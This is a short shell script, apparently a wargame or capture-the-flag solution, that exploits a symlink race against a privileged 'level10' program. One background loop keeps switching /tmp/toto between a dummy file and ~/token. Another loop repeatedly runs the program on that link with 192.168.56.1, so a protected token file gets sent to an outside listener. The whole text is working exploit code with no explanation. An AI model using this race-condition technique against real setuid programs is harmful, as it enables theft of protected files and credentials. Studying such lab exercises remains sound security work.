touch /tmp/fake

(while true
do
        ln -s -f /tmp/fake /tmp/toto
        ln -s -f ~/token /tmp/toto
done)&

while true
do
        ~/level10 /tmp/toto 192.168.56.1 &> /dev/null
done;